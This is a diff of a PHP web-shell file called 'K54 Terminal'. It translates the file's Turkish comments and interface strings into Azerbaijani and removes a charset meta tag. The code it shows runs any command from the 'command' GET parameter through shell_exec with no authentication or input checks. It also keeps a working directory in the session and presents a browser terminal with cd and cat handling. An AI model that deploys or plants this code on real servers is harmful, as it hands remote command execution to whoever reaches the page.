@@ -1,17 +1,17 @@
 <?php
 session_start();
 
-// Fonksiyon: Dosya uzantısına göre içeriği işle
+// Faylların uzantılarına görə məzmunu emal etmək üçün funksiya
 function processContentByExtension($content, $extension) {
-    // PHP ve HTML dosyalarını metin olarak işle
+    // PHP və HTML fayllarını mətn olaraq emal et
     if ($extension == "php" || $extension == "html" || $extension == "htm") {
         return highlight_string($content, true);
     }
-    // Diğer dosyaları normal olarak işle
+    // Digər faylları normal şəkildə emal et
     return $content;
 }
 
-// Oturumda mevcut dizini sakla
+// Sessiyada cari qovluğu saxla
 if (!isset($_SESSION['current_directory'])) {
     $_SESSION['current_directory'] = __DIR__;
 }
@@ -24,7 +24,7 @@ if(isset($_GET['command'])) {
     if (strpos($command, 'cd ') !== false) {
         $parts = explode(' ', $command);
         if (count($parts) < 2) {
-            echo "<pre>No directory specified. Usage: cd [directory]</pre>";
+            echo "<pre>Kömək: cd [qovluq]</pre>";
         } else {
             $directory = trim($parts[1]);
             chdir($currentDirectory);
@@ -34,7 +34,7 @@ if(isset($_GET['command'])) {
         }
     } else {
         $output = shell_exec("cd ".$currentDirectory." && ".$command);
-        // "cat" komutu için çıktıları işle
+        // "cat" əmri üçün çıxarılanları emal et
         if (strpos($command, 'cat ') !== false) {
             $parts = explode(' ', $command);
             $filename = trim($parts[1]);
@@ -50,7 +50,6 @@ if(isset($_GET['command'])) {
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
     <title>K54 Terminal</title>
     <style>
         body {
@@ -84,8 +83,8 @@ if(isset($_GET['command'])) {
             padding: 5px;
             border-radius: 5px;
             background-color: #222;
-            overflow-x: auto; 
-            word-wrap: break-word; 
+            overflow-x: auto; /* Yatay kaydırma əlavə edin */
+            word-wrap: break-word; /* Uzun sözləri qırpaq və düzgün görüntüləmək üçün */
         }
         #mainDirButton {
             position: fixed;
@@ -104,10 +103,10 @@ if(isset($_GET['command'])) {
 <body>
 <div id="terminal"></div>
 <div id="currentDir">terminal@K54: <?php echo $currentDirectory; ?> ></div>
-<input type="text" id="command" placeholder="Komut girin..." autofocus autocomplete="off">
-<button id="mainDirButton">Ana Dizine Git</button>
+<input type="text" id="command" placeholder="Komand daxil edin..." autofocus autocomplete="off">
+<button id="mainDirButton">Əsas Qovluğa Keç</button>
 <script>
-    // Terminali güncelle
+    // Terminali yenilə
     function updateTerminal(response) {
         var outputDiv = document.createElement("div");
         outputDiv.classList.add("command-output");
@@ -116,7 +115,7 @@ if(isset($_GET['command'])) {
         document.getElementById("terminal").scrollTop = document.getElementById("terminal").scrollHeight;
     }
 
-    // Mevcut dizini güncelle
+    // Cari qovluğu yenilə
     function updateCurrentDirectory() {
         var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
@@ -129,7 +128,7 @@ if(isset($_GET['command'])) {
         xhr.send();
     }
 
-    // Belirli aralıklarla mevcut dizini güncelle
+    // Belirli aralıqlarla cari qovluğu yenilə
     setInterval(updateCurrentDirectory, 1000);
 
     document.getElementById("command").addEventListener("keyup", function(event) {
@@ -148,9 +147,9 @@ if(isset($_GET['command'])) {
         }
     });
 
-    // "Ana Dizine Git" butonuna tıklanınca
+    // "Əsas Qovluğa Keç" düyməsinə klik olunarkən
     document.getElementById("mainDirButton").addEventListener("click", function(event) {
-        event.preventDefault(); // Formun gönderilmesini engelle
+        event.preventDefault(); // Formun göndərilməsini dayandır
         var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
             if (xhr.readyState == 4 && xhr.status == 200) {
